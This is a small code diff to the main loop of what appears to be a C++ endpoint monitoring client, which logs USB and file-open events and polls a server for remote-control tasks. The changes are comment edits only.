@@ -173,6 +173,7 @@ int main(int argc, char *argv[])
 			app.SendLog(NULL, logMessage.c_str(), USB_PLUG_EVENT);
 		}
 
+		// 从缓冲区读取‘文件打开事件通知’
 		if (GetInformMessage(localPath, MAX_PATH))
 		{
 			printf("get new task: %s\n", localPath);
@@ -190,9 +191,7 @@ int main(int argc, char *argv[])
 			CleanTmpFiles(file);
 		}
 
-		//cout << "Before GetFromServer" << endl;
 		app.GetFromServer();   // 接收服务端发送的 远程控制指令
-		//cout << "After GetFromServer" << endl;
 
 		app.ExecControl();    // 处理远程控制任务
 		app.HeartBeat();	  // 休眠 CLIENT_SLEEP_TIME 毫秒定时向服务端发送一个心跳包
@@ -204,7 +203,7 @@ int main(int argc, char *argv[])
 		}		
 	}
 	// 等待线程执行结束
-	//WaitForSingleObject(hThread, INFINITE);
+	// WaitForSingleObject(hThread, INFINITE);
 
 	return 0;
 }
